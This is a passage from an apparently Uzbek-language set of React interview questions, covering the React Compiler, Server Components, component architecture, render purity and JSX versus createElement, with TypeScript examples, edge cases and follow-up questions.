- R17 → R18: `createRoot` ishlatish, automatic batching effects (ba'zi kodlar break)
- R18 → R19: ref forwardRef → ref prop, `<Context.Provider>` → `<Context>`, propTypes/defaultProps olib tashlandi function komponentlardan

</details>

### Edge Cases

- **R18 ga upgrade — automatic batching breaking change**: Pre-R18 kod `setTimeout(() => setState(a))` keyin `setTimeout(() => setState(b))` — ikki re-render kutardi. R18'da bitta. Test'lar buzilishi mumkin.
- **Strict Mode 2x effect — yangi development pattern**: Mount → cleanup → mount cycle — barcha effect'lar idempotent bo'lishi shart. Eski kod (`fetch` `useEffect` ichida cleanup'siz) — ikki marta fetch.
- **R19 ref as prop — forwardRef hali deprecated EMAS**: `forwardRef` ishlaydi (gradually phased out); ref'ni oddiy prop sifatida qabul qilish modern style.

### Follow-up savollar

- "Hooks paydo bo'lishidan oldin function component yarmadimi-edi?" — Bor edi (`function Greeting(props)`), lekin state/lifecycle yo'q edi — "stateless functional components" deyilardi. Hooks ulardan to'liq class replacement yaratdi.
- "R19 RSC eng katta o'zgarish-mi?" — Kontekstual: ekosistema (Next.js, Remix) uchun ha. Vanilla React app uchun yo'q (RSC framework'siz ishlamaydi).
- "Concurrent rendering R19'gacha optional edimi?" — Ha. R18'da `createRoot` ishlatilgan paytda concurrent yoqilardi, lekin features (`useTransition`) opt-in edi. R19'da Suspense uchun concurrent default.

</details>

---

### 7. React Compiler nima va manual memoization bilan munosabati [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**React Compiler** — build-time tool (Babel plugin) — komponentlar va hooks'ni avtomatik memoize qiladi (`useMemo`, `useCallback`, `React.memo` kerak emas). Static analysis orqali qaysi qiymatlar o'zgaradi va qaysi komponent re-render kerakligini aniqlaydi. Manual memoization deyarli ortiqcha bo'ladi — Compiler aniqroq va to'g'riroq qaror qabul qiladi.

### To'liq tushuntirish

**Compiler nima qiladi:**

1. **Source code'ni AST'ga parse qiladi**
2. **Reactivity DAG quradi** — qaysi value qaysi qiymatga bog'liq
3. **Auto-memoization inject qiladi** — granular cache (har sub-expression uchun)
4. **"Rules of React" violations'ni aniqlaydi** — mutability, side effects taqiqlangan joylarda

**Manual memoization muammolari (Compiler hal qiladi):**

```tsx
// ❌ Manual memoization — har gal yangi reference
function Parent() {
  const [count, setCount] = useState(0);
  const items = [1, 2, 3];  // ← har render yangi array
  const handler = () => console.log(count);  // ← har render yangi function
  return <Child items={items} onAction={handler} />;  // ← memo bypass
}

// ⚠️ Manual fix — verbose, error-prone
function Parent() {
  const [count, setCount] = useState(0);
  const items = useMemo(() => [1, 2, 3], []);
  const handler = useCallback(() => console.log(count), [count]);
  return <Child items={items} onAction={handler} />;
}

// ✅ Compiler — manual yo'q, lekin Child memoized bo'ladi
function Parent() {
  const [count, setCount] = useState(0);
  const items = [1, 2, 3];
  const handler = () => console.log(count);
  return <Child items={items} onAction={handler} />;
}
// Compiler shu kodni quyidagicha optimallashtiradi:
// const $ = useMemoCache(3);
// const items = $[0] !== "init" ? ($[0] = "init", $[1] = [1, 2, 3]) : $[1];
// const handler = $[2] !== count ? ($[2] = count, $[3] = () => ...) : $[3];
```

### Kod misoli

```tsx
// 1. Setup (Babel plugin)
// babel.config.js
export default {
  plugins: [
    ["babel-plugin-react-compiler", { target: "19" }],
  ],
};

// 2. Component (manual memo'siz)
interface SearchProps {
  users: User[];
}

function Search({ users }: SearchProps) {
  const [query, setQuery] = useState("");

  // Compiler bu computation'ni avto-memoize qiladi
  const filtered = users.filter((u) =>
    u.name.toLowerCase().includes(query.toLowerCase())
  );

  return (
    <div>
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      <UserList users={filtered} />
    </div>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Compiler internals (sodda):**

1. **HIR (High-level IR)** — JSX + Hooks AST, mutability tracking bilan
2. **SSA (Static Single Assignment)** — har variable bir marta assign qilinadi (mental model)
3. **Reactivity scopes** — qaysi expression qaysi reactive value'larga bog'liq
4. **Memoization pass** — har scope uchun cache slot yaratiladi, deps comparison generated

**Generated code (sodda):**

```tsx
// Source
function Component({ name }) {
  const greeting = `Hello, ${name}`;
  return <p>{greeting}</p>;
}

// Compiled (taxminan)
import { c as useMemoCache } from "react/compiler-runtime";

function Component({ name }) {
  const $ = useMemoCache(2);
  let greeting;
  if ($[0] !== name) {
    greeting = `Hello, ${name}`;
    $[0] = name;
    $[1] = greeting;
  } else {
    greeting = $[1];
  }
  return <p>{greeting}</p>;
}
```

`useMemoCache` — array per fiber, hooks'ga o'xshash linked list slotlardan foydalanadi.

**"Rules of React" — Compiler talablar:**

1. **Components va hooks pure** bo'lishi shart (no side effects in body)
2. **State immutable** — `setState`'dan tashqari mutate qilmaslik
3. **Hooks rules** — top-level only, React function only
4. **Effects only for synchronization** — render natijasi uchun emas

**Compiler skip qiladigan holatlar:**

- "use no memo" directive bilan komponent
- Rules violation aniqlangan komponent (Compiler safe-by-default)
- ESLint plugin orqali `// @ts-ignore` kabi opt-out

**Manual memoization Compiler bilan:**
- ⚠️ `useMemo`/`useCallback` qoladi, lekin **deps'ni Compiler kuzatadi**
- Manual memo eski kodbase'da o'qishga to'sqinlik qiladi (verbose)
- React docs (2026): "Compiler ishlatilsa, manual memo yozmang"

**Compiler limitations (2026 stable holati):**
- TypeScript tip ma'lumotlarini ishlatadi (untyped JS — kamroq optimization)
- Mutable patterns (mutate then setState) — opt-out kerak
- Refs read during render — warning

</details>

### Edge Cases

- **Mixed codebase**: Compiler ba'zi komponentlar uchun ishlamasligi mumkin — fallback'ga `// "use no memo"` directive yoki `useMemo` qoldirish.
- **Mutate-then-setState pattern**: `array.push(x); setArray(array)` — Compiler buni aniqlamaydi (mutation oldindan), reference o'zgarmaydi. Anti-pattern: `setArray([...array, x])` ishlatish.
- **Inline JSX as child**: `<Parent>{<Child />}</Parent>` — Compiler `<Child />` element'ni cache qiladi (key bilan). Manual'da bu deyarli imkonsiz edi.

### Follow-up savollar

- "Compiler `React.memo`'ni almashtiradi-mi?" — Ha, ko'p hollarda. `React.memo` shallow check; Compiler granular reactivity scopes bilan ishlaydi. Lekin `React.memo`'ning `areEqual` custom function — Compiler bunga teng emas, ba'zi holatlar uchun qoladi.
- "Vue 3 reactivity bilan farqi?" — Vue 3 Proxy-based runtime reactivity (har property access track qilinadi). React Compiler — static AST analysis (build-time, no runtime overhead). Solid signals — fine-grained reactive primitive (explicit, getter funktsiya orqali).
- "Compiler bug bo'lsa nima?" — ESLint plugin bilan birga ishlatish, Strict Mode'da test qilish, `// "use no memo"` opt-out, GitHub'ga issue.

</details>

---

### 8. React Server Components (RSC) nima va Client component bilan farqi [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**React Server Components (RSC)** — server'da render qilinadigan komponentlar (Node.js/Edge runtime). State/effect/event handler ishlatmaydilar (ular faqat client'da ishlaydi). Fayl yoki komponent boshida `"use client"` directive yo'q bo'lsa — RSC. Foyda: bundle'ga qo'shilmaydi, database/filesystem to'g'ridan-to'g'ri o'qiy oladi, secret tutadi.

### To'liq tushuntirish

**Component turi (R19+):**

| Tur | Render qaerda | State/Effects | Bundle'ga | Marker |
|-----|---------------|---------------|-----------|--------|
| **Server Component** | Server | ❌ yo'q | ❌ yo'q | Default (no marker) |
| **Client Component** | Server (SSR) + Client (hydration) | ✅ ha | ✅ ha | `"use client"` directive |

**RSC nima qila oladi:**
- ✅ Async function (`async function Component() { ... }`)
- ✅ Database query (`await db.users.findMany()`)
- ✅ File system read (`await fs.readFile(...)`)
- ✅ Secret API key ishlatish (browser'ga sizmaydi)
- ✅ Heavy library import (server-side, client bundle'siz)

**RSC nima qila olmaydi:**
- ❌ `useState`, `useEffect`, `useReducer` (state hook'lar)
- ❌ Event handler (`onClick`, `onChange`)
- ❌ Browser API (`window`, `localStorage`)
- ❌ Class komponentlar
- ❌ `useContext` (faqat Server Context — boshqa)

### Kod misoli

```tsx
// app/products/page.tsx (Server Component — default)
import { db } from "@/lib/db";
import { ProductCard } from "./ProductCard";

// async server component — bundle'ga qo'shilmaydi
async function ProductsPage() {
  // Database query server'da to'g'ridan-to'g'ri
  const products = await db.product.findMany({
    where: { active: true },
    take: 20,
  });

  return (
    <div>
      <h1>Products</h1>
      <div className="grid">
        {products.map((p) => (
          <ProductCard key={p.id} product={p} />
        ))}
      </div>
    </div>
  );
}

export default ProductsPage;
```

```tsx
// app/products/ProductCard.tsx (Client Component)
"use client";

import { useState } from "react";
import type { Product } from "@/types";

export function ProductCard({ product }: { product: Product }) {
  const [liked, setLiked] = useState(false);

  return (
    <article>
      <h2>{product.name}</h2>
      <p>${product.price}</p>
      <button onClick={() => setLiked(!liked)}>
        {liked ? "❤" : "♡"}
      </button>
    </article>
  );
}
```

**Boundary qoidasi:**
- Server Component → Client Component: ✅ (props orqali, **serializable** ma'lumotlar)
- Client Component → Server Component: ❌ (faqat `children` orqali — composition)

```tsx
// ✅ Server -> Client (props serializable bo'lishi shart)
<ClientButton label="Save" /> // OK
// ❌ Mumkin emas: function/Date/Map/Class instance pass — JSON-like serializable only

// ✅ Client -> Server (composition pattern)
<ClientLayout>
  {/* Server Component children sifatida */}
  <ServerProductsList />
</ClientLayout>
```

<details>
<summary><strong>Deep Dive</strong></summary>

**RSC payload (wire format):**

Server komponent render bo'lganda, output **HTML emas** — special **RSC payload** (text format):

```
0:["$","html",null,{"children":["$","body",null,{"children":["$","$L1",null,{"products":[{"id":1,"name":"Phone"}]}]}]}]
1:I["./ProductCard.tsx#ProductCard"]
```

- `0:` — root tree (server-rendered nodes + client placeholder references)
- `1:I` — Client component module reference (bundler'da chunk URL)

Client browser shu payload'ni parse qiladi:
1. Server tree'ni rebuild qiladi (React Element tree)
2. Client placeholder'larni topadi (`$L1`)
3. Module'ni dynamic import qiladi
4. Hydration: barchasini bir butun tree sifatida render

**Streaming + Suspense:**

```tsx
async function Page() {
  return (
    <>
      <h1>Products</h1>
      <Suspense fallback={<Skeleton />}>
        <SlowProducts /> {/* await ichida */}
      </Suspense>
      <Suspense fallback={<Skeleton />}>
        <Reviews /> {/* await ichida */}
      </Suspense>
    </>
  );
}
```

Server progressive HTML yuboradi — Header darhol, suspended content keyinroq. Client ham progressive hydrate qiladi.

**Module graph split:**
- `"use client"` directive — bundler boundary marker
- Server bundle (Node.js): server komponentlar + framework
- Client bundle (browser): faqat client komponentlar + framework

**Server Actions integration:**

```tsx
// app/actions.ts
"use server";  // server function marker

export async function deletePost(id: string) {
  await db.post.delete({ where: { id } });
  revalidatePath("/posts");
}

// app/posts/Post.tsx (Client)
"use client";
import { deletePost } from "../actions";

function Post({ id }: { id: string }) {
  return (
    <form action={deletePost.bind(null, id)}>
      <button type="submit">Delete</button>
    </form>
  );
}
```

Form submit → RPC over HTTP → server function ishlaydi → response RSC payload bilan UI yangilanadi.

**Framework requirement:**

RSC vanilla React'da **ishlamaydi**. Quyidagilar kerak:
1. **Bundler** — `"use client"` directive ni tanish, server/client bundle ajratish
2. **Server runtime** — RSC payload generate qilish, streaming
3. **Router integration** — RSC route'larni client navigation bilan birlashtirish

Hozirgi frameworks: **Next.js App Router**, **Waku**, **TanStack Start (in dev)**, **Redwood (planned)**.

**Performance characteristics:**
- ✅ Bundle size kamayadi (server kod client'ga yetmaydi)
- ✅ Initial paint tezroq (server HTML)
- ✅ Database query waterfall yo'q (server-side data fetching)
- ⚠️ Network roundtrip server-side action uchun
- ⚠️ Caching strategy murakkab (RSC payload caching)

</details>

### Edge Cases

- **Third-party library `"use client"`'siz**: Eski library'lar `useState` ishlatadi lekin marker yo'q — `'use client'` qo'shish uchun wrapper component yaratish kerak.
- **Conditional client/server**: Komponent ham server ham client'da ishlatilishi mumkin — agar marker yo'q bo'lsa va hooks ishlatmasa.
- **Environment variables**: `process.env.SECRET` server'da OK, client'da `NEXT_PUBLIC_*` faqat (Next.js convention).

### Follow-up savollar

- "RSC SSR'ga teng-mi?" — Yo'q. SSR — komponent client'da ishlaydi (state/effect bor), server'da HTML uchun bir marta render qilinadi. RSC — server'da yashaydi, client'da yo'q.
- "RSC SEO'ga ta'siri?" — SSR bilan bir xil yoki yaxshiroq (HTML stream). Crawl qilinadi, hydration kerak emas non-interactive content uchun.
- "RSC'ni qaysi paytda Client'ga ko'chirish kerak?" — Interactive elements (form, button click), browser API (localStorage), event handler kerak bo'lganda. Default — Server, faqat kerak bo'lganda Client.

</details>

---

### 9. Component-based architecture nima va React nima uchun shu yondashuvni tanladi? [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Component** — UI'ning mustaqil, qayta ishlatiluvchi qismi (function yoki class). Har komponent o'z markup, behavior, va (ixtiyoriy) state'iga ega. React UI'ni komponentlardan tashkil topgan tree sifatida modellashtiradi. Sabab: separation of concerns, reusability, isolated reasoning, scaling.

### To'liq tushuntirish

**Komponentning xususiyatlari:**

1. **Encapsulation** — markup + style + behavior bir joyda
2. **Reusability** — bir marta yozish, ko'p joyda ishlatish
3. **Composability** — komponentlar bir-biriga ulanib, murakkab UI quradi
4. **Isolation** — komponent ichki state boshqa komponentlarga ko'rinmas
5. **Testability** — har komponent alohida test qilinadi

**Tarixiy kontekst (nima uchun):**
- 2010-larda jQuery/MVC frameworks (Backbone, Ember) DOM manipulation va template'ni ajratardi
- HTML, CSS, JS — alohida fayllar (separation of technology)
- Lekin **bir UI bo'lagi uchun barcha 3'i kerak** — fayllar bo'ylab tarqoq
- Component-based: **separation of concerns** = bir UI birligi = bir komponent (HTML+CSS+JS birga)

### Kod misoli

```tsx
// ✅ React component — concern by feature
interface UserCardProps {
  name: string;
  onDelete: (name: string) => void;
}

function UserCard({ name, onDelete }: UserCardProps) {
  return (
    <div className="user-card">
      <h2 className="user-name">{name}</h2>
      <button onClick={() => onDelete(name)}>Delete</button>
    </div>
  );
}

// Bir fayl, encapsulated, type-safe, reusable
```

**Composition example:**

```tsx
function App() {
  return (
    <Page>
      <Header>
        <Logo />
        <Navigation />
      </Header>
      <Main>
        <UserList />
      </Main>
      <Footer />
    </Page>
  );
}
```

UI tree = komponent tree. Har birini alohida o'qish, test qilish, refactor qilish mumkin.

<details>
<summary><strong>Deep Dive</strong></summary>

**Komponent vs Module:**
- **Module** (ES module) — kod birligi (`import/export`)
- **Component** — UI birligi (state + render)
- React komponent odatda module ichida yashaydi, lekin bir module bir nechta komponent eksport qilishi mumkin

**Komponent vs Element:**
- **Element** (`<Button />`) — komponentni chaqirish natijasidagi description (React Element object)
- **Component** (`function Button()`) — element'ni qanday render qilishni tushuntiruvchi function/class
- Tipik adashish: "Component renders" — aslida element komponentdan yaratiladi va render qilinadi

**Komponent vs Web Components:**
| | React Component | Web Components (Custom Elements) |
|--|------------------|----------------------------------|
| Standard | React API | W3C standard |
| Scoping | JS function scope | Shadow DOM (CSS isolation) |
| Cross-framework | React only | Any framework |
| Reactivity | React reconciler | Manual or libraries (Lit) |

R19'da React-Web Components interop yaxshilandi (properties, custom events).

**Atomic Design methodology:**
- **Atoms** — eng kichik (Button, Input)
- **Molecules** — atom kombinatsiyasi (SearchBar = Input + Button)
- **Organisms** — biznes-logikaga ega (Header, ProductCard)
- **Templates** — sahifa layout (page skeleton)
- **Pages** — instance (real data bilan)

React design system'larda (MUI, Chakra, shadcn/ui) shu pattern qo'llanadi.

**React komponent fan-in/fan-out:**
- Fan-in: 1 komponent → ko'p sahifalarda ishlatiladi (high reuse)
- Fan-out: 1 komponent → ko'p bola komponentlarni ishlatadi (composition)
- Yaxshi dizayn: high fan-in (atoms), o'rta fan-out (organisms)

**Performance considerations:**
- Komponent boundary = potential memoization point (React.memo)
- Komponent boundary = render scope (state shu komponentda re-render trigger qiladi)
- Ko'p kichik komponentlar — ko'proq Fiber, ko'proq diff work; lekin reuse va memoization yutuq

</details>

### Edge Cases

- **God component** anti-pattern: 500+ qatorli komponent — barcha logic'ni o'z ichiga oladi. Yechim: bola komponentlarga ajratish (single responsibility).
- **Over-componentization**: Har element uchun komponent yaratish — overhead. Inline JSX bilan yetadi agar reuse yo'q bo'lsa.
- **Inline arrow function as component**: `const Comp = () => <p>{x}</p>` parent ichida — har gal yangi komponent type, butun subtree unmount/remount.

### Follow-up savollar

- "Komponent qachon ajratish kerak?" — Reuse bo'lsa (3+ joy), 100+ qator bo'lsa, alohida concern bo'lsa, alohida test qilish kerak bo'lsa.
- "Function vs Class — qaysi yaxshi?" — Function + Hooks default. Class faqat error boundaries (R19'gacha).
- "Higher-Order Component (HOC) — komponentmi-pattern-mi?" — Pattern. HOC = function takes Component, returns Component. R19+ ko'p hollarda Custom Hooks bilan almashtiriladi.

</details>

---

### 10. `UI = f(state)` deganda nima ma'no? Pure function model qanday ishlaydi? [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

`UI = f(state)` — React'ning **mathematical model**: UI tasviri (JSX tree) state'ning **pure function** natijasi. Bir xil state — bir xil UI (deterministik). Side effect, mutation, random'siz. Bu invariant React Reconciler'ning bailout, restart (concurrent), Strict Mode 2x render kabi feature'lariga asos bo'ladi. Buzilsa — non-deterministik UI, render restart'da boshqa natija, hard-to-debug bug'lar.

### To'liq tushuntirish

**Mathematical model:**

```
state ──► f(state) ──► UI tasviri (JSX)
            ▲
            │
   props (parent state'i),
   context (yuqorida defined state),
   external store (subscribed state)
```

`f` — komponent funksiyasi. Har gal bir xil input → bir xil output:

```tsx
function Counter({ count }: { count: number }) {
  return <p>Count: {count}</p>;
}

// f(0) = <p>Count: 0</p>
// f(1) = <p>Count: 1</p>
// f(0) = <p>Count: 0</p>  ← har gal bir xil
```

**`f` qaysi state'larga bog'liq:**

1. **Props** — parent dan kelgan state
2. **`useState`** — komponent ichki state
3. **`useContext`** — context tree'dan
4. **`useSyncExternalStore`** — external store (Redux, Zustand)
5. **`useRef.current`** — ⚠️ render'da o'qish concurrent rendering'ga zid (ref render trigger qilmaydi)

**Pure function qoidalari (render body'da):**

- ✅ Read props, state, context
- ✅ Compute derived values (filter, map, sort)
- ✅ Return JSX
- ❌ `setState` (infinite loop)
- ❌ DOM mutation (`document.title = ...`)
- ❌ Network request (`fetch`)
- ❌ Random / Date.now / Math.random (non-deterministik)
- ❌ External mutable state read (window.scrollY, localStorage)

### Kod misoli

```tsx
// ✅ Pure render — UI = f(state)
function ProductList({ products, query }: { products: Product[]; query: string }) {
  const filtered = products.filter((p) =>
    p.name.toLowerCase().includes(query.toLowerCase())
  );

  return (
    <ul>
      {filtered.map((p) => (
        <li key={p.id}>
          {p.name} — ${p.price}
        </li>
      ))}
    </ul>
  );
}
// f(products, query) — deterministik, bir xil input → bir xil JSX

// ❌ Impure render — UI = f(state, time, random)
function BadProduct({ product }: { product: Product }) {
  const id = Math.random();         // ❌ har render boshqa
  const now = Date.now();           // ❌ tashqi mutable state
  document.title = product.name;    // ❌ side effect
  fetch(`/log?id=${product.id}`);   // ❌ network
  product.viewed = true;            // ❌ mutation

  return <div data-id={id}>{product.name} ({now})</div>;
}
```

**Derived state — `f` ichida hisoblash:**

```tsx
// ✅ Derived state — extra useState YO'Q
function ShoppingCart({ items }: { items: Item[] }) {
  const total = items.reduce((sum, item) => sum + item.price, 0);  // f(items)
  const count = items.length;
  const isEmpty = count === 0;

  return (
    <div>
      <p>Items: {count}</p>
      <p>Total: ${total}</p>
      {isEmpty && <p>Cart empty</p>}
    </div>
  );
}

// ❌ Anti-pattern: derived state'ni useState'da saqlash
function BadCart({ items }: { items: Item[] }) {
  const [total, setTotal] = useState(0);  // ❌ kerak emas
  useEffect(() => {
    setTotal(items.reduce((sum, item) => sum + item.price, 0));
  }, [items]);
  // Sabab: extra render cycle, sync bug, complexity
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Pure function — concurrent rendering invariant:**

Concurrent rendering'da React render'ni:
1. **Abort qilishi mumkin** — high-priority interrupt kelganda
2. **Qayta boshlashi mumkin** — abort qilingan render'ni restart
3. **Multiple times chaqirishi mumkin** — Strict Mode 2x

Pure render bu uchovida ham xavfsiz — natija doim bir xil. Impure render — har retry boshqa natija, race condition.

```typescript
// React internal (concurrent rendering)
function renderRootConcurrent(root) {
  while (workInProgress !== null && !shouldYield()) {
    performUnitOfWork(workInProgress);
  }

  if (workInProgress === null) {
    commitRoot(root);
  } else {
    // Abort, restart with higher priority later
    workInProgressRoot = null;
    return RootIncomplete;
  }
}
```

Render abort bo'lsa, yangi cycle'da WIP tree qayta quriladi. Side effect bo'lsa — ikki marta ishlatiladi (e.g., 2 ta fetch).

**Strict Mode 2x — purity check:**

```tsx
function MyComponent() {
  let counter = 0;
  counter++;             // ❌ side effect
  console.log(counter);  // dev: 1, 2, 1, 2, ... (StrictMode 2x render)

  return <div>{counter}</div>;
}
```

Strict Mode dev'da 2x render — pure bo'lsa output bir xil, impure bo'lsa farq.

**Mathematical purity vs React purity:**

| Strict math | React |
|-------------|-------|
| `f(x) = y` only | Render funksiyasi closures'ga bog'liq (state, context) |
| No side effects | Read OK, write NO |
| Referentially transparent | Same input (state+props) → same JSX |

React purity — **render time'da** pure, lekin event handler / effect'da side effect OK:

```tsx
function Counter() {
  const [count, setCount] = useState(0);

  // ✅ Render time — pure
  const doubled = count * 2;

  // ✅ Event handler — side effect OK
  const handleClick = () => {
    setCount(count + 1);          // setState
    document.title = `${count}`;  // DOM mutation
  };

  // ✅ Effect — side effect OK
  useEffect(() => {
    fetch(`/log?count=${count}`);  // network
  }, [count]);

  return <button onClick={handleClick}>{doubled}</button>;
}
```

**Render purity vs hooks state:**

```tsx
function MyComponent() {
  const [count, setCount] = useState(0);
  // useState render'da chaqiriladi — pure?
  // ✅ Yes — useState render'da yangi state yaratmaydi, mavjud state'ni qaytaradi
  // (mountState faqat ilk render'da yangi state yaratadi)
}
```

`useState` — `f` ichida side effect emas (state mavjud, faqat read).

**External libraries pattern:**

```tsx
// ✅ Render-safe external read
function StoreView() {
  const data = useSyncExternalStore(
    store.subscribe,
    () => store.getState(),    // pure read
    () => store.getServerState() // SSR
  );
  return <div>{data}</div>;
}

// ❌ Direct external read in render
function BadStoreView() {
  const data = store.getState();  // ❌ no subscription, tearing risk
  return <div>{data}</div>;
}
```

`useSyncExternalStore` — concurrent-safe. Direct `store.getState()` — tearing (concurrent render different snapshots).

**Render purity benefits — production:**

- **Memoization possible** — `React.memo`, `useMemo` ishlash uchun pure shart
- **Time-travel debugging** — Redux DevTools state replay
- **SSR consistency** — server va client bir xil natija
- **Testing** — pure function easy to test

**Common impurity bugs:**

```tsx
// 1. Reading mutable global
function MyClock() {
  const time = new Date();  // ❌ different each render
  return <p>{time.toString()}</p>;
}

// ✅ Effect bilan
function MyClock() {
  const [time, setTime] = useState(new Date());
  useEffect(() => {
    const id = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(id);
  }, []);
  return <p>{time.toString()}</p>;
}

// 2. Mutating props
function UserCard({ user }: { user: User }) {
  user.lastViewed = Date.now();  // ❌ mutating parent state
  return <div>{user.name}</div>;
}

// 3. Non-pure useMemo
const filtered = useMemo(() => {
  console.log("computing");      // ❌ side effect in useMemo
  return items.filter(...);
}, [items]);
```

</details>

### Edge Cases

- **`Math.random()` in JSX render**: Non-deterministic — Strict Mode 2x'da farq, hydration mismatch, concurrent restart bug. Yechim: `useId` (R18+) yoki state'da saqlash.
- **`new Date()` in render**: Same issue. SSR'da server/client time farqi → hydration mismatch. Yechim: `useEffect` ichida initial set.
- **Reading `window.scrollY` in render**: SSR'da `window` yo'q. Concurrent'da har retry farqli value. Yechim: `useSyncExternalStore`.
- **`console.log` in render**: Texnik side effect, lekin React'ga ta'sir qilmaydi (faqat dev debugging). Production'da olib tashlash.

### Follow-up savollar

- "Pure render Vue'da ham majburlanadi-mi?" — Vue 3 — composable setup() pure expected, lekin template binding reactive (mutation tracked). React stricter explicit purity.
- "React Compiler purity buzilsa nima qiladi?" — Skip optimization (no auto-memo) yoki ESLint warning (`react-compiler/rules-of-react`). Mutation patterns'ni avtomatik aniqlaydi.
- "Pure render hooks tartibini ham talab qiladi-mi?" — Ha. Conditional `if (x) useState()` — har render farqli order, hooks linked list bug. "Rules of Hooks" purity'ning bir qismi.

</details>

---

### 11. JSX shart-mi React uchun? `React.createElement` bilan ishlash mumkinmi? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX **shart emas** — React'ni `React.createElement(type, props, ...children)` bilan to'liq ishlatish mumkin. JSX faqat **syntactic sugar** — Babel/SWC ikkalasini bir xil function call'ga aylantiradi. JSX afzalligi: HTML-like syntax, IDE highlighting, TypeScript namespace. JSX'siz ishlatish: build step'siz minimal setup, dynamic component generation, hyperscript-style API (Mithril, Hyperscript).

### To'liq tushuntirish

**`React.createElement` signature:**

```typescript
function createElement<P>(
  type: string | ComponentType<P>,
  props?: P | null,
  ...children: ReactNode[]
): ReactElement<P>;
```

**JSX → `createElement` mapping:**

```tsx
// JSX
<button onClick={handler} className="btn">Click me</button>

// Equivalent createElement
React.createElement(
  "button",
  { onClick: handler, className: "btn" },
  "Click me"
);

// Component
<MyComponent foo="bar">{children}</MyComponent>
React.createElement(MyComponent, { foo: "bar" }, children);

// Fragment
<>
  <h1>A</h1>
  <p>B</p>
</>
React.createElement(React.Fragment, null,
  React.createElement("h1", null, "A"),
  React.createElement("p", null, "B")
);
```

### Kod misoli

**Build step'siz React app — JSX'siz:**

```html
<!DOCTYPE html>
<html>
<body>
  <div id="root"></div>
  <script type="module">
    import React from "https://esm.sh/react@19";
    import { createRoot } from "https://esm.sh/react-dom@19/client";

    function Counter() {
      const [count, setCount] = React.useState(0);
      return React.createElement(
        "button",
        { onClick: () => setCount(count + 1) },
        `Count: ${count}`
      );
    }

    const root = createRoot(document.getElementById("root"));
    root.render(React.createElement(Counter));
  </script>
</body>
</html>
```

**Hyperscript-style helper (concise):**

```tsx
import React from "react";

// Hyperscript-style: h(tag, props, ...children)
const h = React.createElement;

function App() {
  return h("div", { className: "app" },
    h("h1", null, "Hello"),
    h("button", { onClick: () => console.log("click") }, "Click")
  );
}

// Mithril-style alternative
const m = (tag, attrs, ...children) =>
  React.createElement(tag, attrs, ...children);
```

**Dynamic component generation:**

```tsx
// JSX'da generated tag yozish noqulay
function DynamicTag({ tag, children }: { tag: string; children: React.ReactNode }) {
  // ❌ JSX <{tag}> SyntaxError
  // ✅ Lowercase variable JSX'da component sifatida tan olinmaydi (lowercase = HTML)
  const Tag = tag as React.ElementType;  // capitalized!
  return <Tag>{children}</Tag>;
}

// Yoki createElement bilan toza:
function DynamicTag({ tag, children }: { tag: string; children: React.ReactNode }) {
  return React.createElement(tag, null, children);
}

// Usage
<DynamicTag tag="h1">Title</DynamicTag>
<DynamicTag tag="span">Inline</DynamicTag>
```

<details>
<summary><strong>Deep Dive</strong></summary>

**`createElement` vs `_jsx` (R17+ Automatic):**

```typescript
// react/jsx-runtime (Automatic transform)
export function jsx(type, props, key) {
  return {
    $$typeof: REACT_ELEMENT_TYPE,
    type,
    key: key !== undefined ? "" + key : null,
    ref: null,  // R19'da `ref` props ichida
    props,
  };
}

// react (Classic transform — backward compat)
export function createElement(type, config, ...children) {
  let propsWithChildren = { ...config };
  if (children.length === 1) {
    propsWithChildren.children = children[0];
  } else if (children.length > 1) {
    propsWithChildren.children = children;
  }
  return jsx(type, propsWithChildren);
}
```

`createElement` — variadic children API. `_jsx` — children property'da, simpler.

**Babel transformation:**

```jsonc
// .babelrc (Classic)
{
  "presets": [
    ["@babel/preset-react", {
      "runtime": "classic",
      "pragma": "React.createElement",  // override
      "pragmaFrag": "React.Fragment"
    }]
  ]
}

// .babelrc (Automatic — default R17+)
{
  "presets": [
    ["@babel/preset-react", {
      "runtime": "automatic",
      "importSource": "react"
    }]
  ]
}
```

**Custom JSX runtime — Preact, Solid:**

```tsx
/** @jsx h */
import h from "preact";

function App() {
  return <button>Click</button>;
}
// Compiled: h("button", null, "Click") — Preact's vnode

/** @jsxImportSource solid-js */
function App() {
  return <button>Click</button>;
}
// Compiled: createComponent(...) — Solid's reactive primitive
```

**Hyperscript libraries — JSX'siz design:**

```typescript
// hyperscript helper functions library
import h from "hyperscript-helpers";
const { div, h1, button } = h(React.createElement);

function App() {
  return div(".app",
    h1("Hello"),
    button({ onClick: handler }, "Click")
  );
}
```

**Performance — JSX vs createElement:**

- Compile time: JSX → createElement transform (Babel/SWC fast)
- Runtime: identical (ikkalasi React Element object yaratadi)
- Bundle size: equivalent (transform output bir xil)

**`createElement` direct call — debug-friendly:**

```typescript
// Element object structure (createElement output):
{
  $$typeof: Symbol(react.element),
  type: "button",         // string yoki function
  key: null,
  ref: null,
  props: {
    onClick: handler,
    className: "btn",
    children: "Click"
  }
}

// JSX bilan teng — only difference is syntax
```

**Type checking — TypeScript:**

```typescript
// JSX (TSX)
const el: React.ReactElement = <button>Click</button>;
// TypeScript JSX namespace bilan — props type-checked

// createElement
const el: React.ReactElement = React.createElement("button", null, "Click");
// TypeScript element type — `unknown` props (less strict)
```

JSX afzalligi — **better TypeScript inference** (intrinsic elements).

**Hyperscript-React migration:**

Hyperscript codebase JSX'ga o'tkazish — ko'pincha codemod bilan:

```bash
# Hyperscript → JSX automated codemod
npx hyperscript-to-jsx src/
```

JSX'dan Hyperscript — kerak emas (back-step).

**Modern JSX alternatives (2026):**

1. **Tagged template literals** — `html` template (Lit, htm)
   ```tsx
   import { html } from "htm/react";
   const view = html`<button onClick=${handler}>Click</button>`;
   ```
2. **Compiled DSL** — Vue SFC, Svelte (ko'proq optimization)
3. **JSX** — React/Preact/Solid default

</details>

### Edge Cases

- **`createElement(null)`**: TypeError — type required.
- **`createElement("div", null, undefined)`**: `children: undefined` — skip render.
- **JSX nested array**: `<div>{[<a />, <b />]}</div>` — keys warning. createElement: `createElement("div", null, [...])` — same.
